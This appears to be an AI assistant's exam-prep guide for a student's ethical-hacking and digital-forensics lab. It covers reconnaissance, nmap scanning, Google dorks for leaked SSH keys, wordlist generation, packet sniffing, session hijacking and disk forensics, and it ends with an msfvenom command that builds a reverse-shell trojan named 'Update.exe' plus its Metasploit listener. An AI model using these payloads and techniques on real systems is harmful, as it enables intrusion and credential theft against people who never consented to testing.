# VPAT
Understood. Here is the complete guide organized **Experiment by Experiment** exactly as per your notes. This is designed for quick access during your lab and to help you answer the examiner's oral questions.

---

## **Exp 2: Passive Reconnaissance**
**Aim:** Gather information about a target (e.g., `youtube.com`, `netflix.com`) without directly interacting with it.
* **Commands:**
    * `whois youtube.com`: Find registrar, owner, and expiry dates.
    * `nslookup -type=mx netflix.com`: Find Mail Exchange (MX) servers.
    * `dig netflix.com MX`: Detailed mail server records.
    * `dig netflix.com NS`: Identify Name Servers.
    * `theHarvester -d netflix.com -l 100 -b duckduckgo`: Harvest emails and subdomains.
* **Oral Tip:** Passive recon is "stealthy" because you are only querying public databases, not the target's server itself.

---

## **Exp 3: Google Dorking**
**Aim:** Use advanced search operators to find misconfigured resources or sensitive files.
* **Commands:**
    * `site:github.com "BEGIN OPENSSH PRIVATE KEY"`: Find leaked SSH keys.
    * `site:ves.ac.in ext:doc`: Find specific document types on a domain.
    * `site:example.com inurl:admin`: Locate hidden login portals.
* **Oral Tip:** It is also known as "Google Hacking." It relies on what search engines have already indexed.

---

## **Exp 4: Active Reconnaissance**
**Aim:** Directly interact with a target system (e.g., `vesit.ves.ac.in`) to find vulnerabilities.

* **Commands:**
    * `ping <target>`: Check connectivity.
    * `nmap -sn <target>`: Host discovery (check if the host is up).
    * `nmap -sT <target>`: TCP Connect scan (completes the 3-way handshake).
    * `nmap -sS <target>`: Stealth SYN scan (half-open, does not complete handshake).
    * `nmap -sV <target>`: Service Version detection.
    * `nmap -O <target>`: Operating System detection.
    * `nikto -h http://<target>`: General web vulnerability scan.
* **Oral Tip:** Active recon is more accurate than passive but is easily detected by firewalls because it sends packets directly to the target.

---

## **Exp 5: Angry IP Scanner**
**Aim:** Scan a range of IP addresses to find live hosts and specific open ports using a GUI tool.
* **Procedure:**
    1.  Enter the target IP range (e.g., `192.168.1.1` to `192.168.1.255`).
    2.  Go to Tools -> Fetchers and ensure "Web detect" or "Ports" are selected.
    3.  Enter ports: `80, 443, 21, 22`.
    4.  Click **Start**. Live hosts will appear as blue/green.

---

## **Exp 7 & 10: Crunch (Wordlist Generation)**
**Aim:** Create custom dictionaries for password cracking.
* **Commands:**
    * `crunch 1 2 -o wordlist.txt`: Generate all combinations of 1 to 2 characters.
    * `crunch 6 6 -t ABC123 -o rahul.txt`: Generate 6-character passwords with a specific pattern.
    * `crunch 2 2 abcdefg... -o wordlist.txt`: Generate combos using a specific character set.
* **Oral Tip:** Wordlists are essential for brute-force and dictionary attacks.

---

## **Exp 8: Wireshark (Network Sniffing) & FTK Imager**
**Part A: Network Sniffing**
* **Procedure:**
    1.  Start capture on the active interface.
    2.  Filter by `http`.
    3.  Find the **HTTP POST** packet.
    4.  Right-click -> Follow -> TCP Stream to see plaintext `username` and `password`.
    5.  Copy `PHPSESSID` to a cookie editor to perform **Session Hijacking**.

**Part B: FTK Imager (Forensics)**
* **Procedure:**
    1.  `File -> Create Disk Image`.
    2.  Select `Image File` and browse for your `.E01` file.
    3.  Verify the MD5/SHA1 hash values to ensure data integrity.

---

## **Exp 9: Autopsy (Digital Forensics)**
**Aim:** Analyze disk images for evidence.
* **Procedure:**
    1.  Create New Case.
    2.  Add Data Source -> Select the E01 image.
    3.  Run Ingest Modules (File Type, Keyword Search).
    4.  **Observe:** Check "Deleted Files" and "Web Artifacts" (history/cookies).
* **Oral Tip:** Autopsy is used to reconstruct user activity from a bit-stream image of a hard drive.

---

## **Exp 11: HTTP vs HTTPS Capture**
**Aim:** Compare how credentials look in secured and unsecured traffic.
* **Procedure:**
    1.  Capture traffic while logging into an HTTP site (e.g., `testphp.vulnweb.com`).
    2.  Observe that credentials are in **plaintext**.
    3.  Capture traffic for an HTTPS site.
    4.  Observe that credentials are **encrypted** and unreadable.

---

## **Exp 12: Creation of Trojan (Metasploit)**
**Aim:** Create a malicious file that provides a reverse shell.

* **Procedure:**
    1.  **Generate Payload:**
        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe > Update.exe
        ```
    2.  **Set up Listener:**
        ```bash
        use exploit/multi/handler
        set payload windows/meterpreter/reverse_tcp
        set LHOST <Attacker_IP>
        set LPORT 4444
        exploit
        ```
* **Oral Tip:** A **Reverse Shell** is used because it bypasses the target's firewall by making the victim connect *out* to the attacker.

---

### **Quick Command Help Cheat Sheet**
| Tool | Help Command |
| :--- | :--- |
| **Nmap** | `nmap -h` |
| **Crunch** | `crunch --help` |
| **Nikto** | `nikto -Help` |
| **Msfvenom** | `msfvenom -h` |
| **Manuals** | `man <tool_name>` |

Good luck with the exam tomorrow! Is there any specific experiment you want to practice one more time?